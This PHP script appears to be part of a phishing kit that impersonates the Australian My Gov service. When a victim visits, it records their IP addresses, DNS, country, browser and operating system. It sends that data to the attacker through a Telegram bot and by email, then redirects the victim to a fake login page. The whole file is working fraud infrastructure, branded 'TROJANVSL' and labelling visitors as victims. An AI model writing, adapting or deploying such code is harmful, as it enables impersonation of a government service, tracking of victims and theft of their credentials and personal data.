<?php
error_reporting(0);
session_start();
ob_start();
include("./Assets/scripts/ServerData.php");
include("./edit.php");

	$message .= "
	<h2 style='text-align: center;'><span style ='color : blue;'>TELEGRAM </span>: TROJAN<span style='color:red;'>VSL</span></h2>
	<h3 style='text-align: center'>My Gov Visitor Alert </h3><br><br>

	<ul>
		<li>Country: " . visitor_country() . "</li><br>
		<li>VICTIM DNS: " . $dns . "</li><br>
		<li>IP Address 1: " . $realip . "</li><br>
		<li>IP Address 2: " . $customip  . "</li><br>
		<li>Browser: " . $browser . "</li><br>
		<li>Device/OS: " . $OS . "</li><br>
		
	</ul>";

	$Gram .= "
	[TG: h4ckecho]
[MY GOV]
 
    ⭐️⭐️⭐️ ATO ALERT ⭐️⭐️⭐️
	 
	    👤 New Visitor Get Ready
	
	
	[IP HOSTNAME DATA]
	
	Country: " . visitor_country() . "
	VICTIM DNS: " . $dns . "
	
	IP Address 1: " . $realip . "
	IP Address 2: " . $customip . "
	Browser: " . $browser . "
	Device/OS: " . $OS . "";

	$response = sendMessage($botToken, $chatID, $Gram);

	$subject = "My Gov [Visitor Alert] from : " . $realip . "\r\n";
	$headers[] = 'MIME-Version: 1.0';
	$headers[] = 'Content-type: text/html; charset=iso-8859-1';
	$headers[] = 'From: VSLMAIL <vslmail@mail.com>';
	$headers[] = 'To: You <user@vslmail.com>';
	mail($receiver, $subject, $message,  implode("\r\n", $headers));
	header("Location: ./user/login");
	ob_end_flush();
?>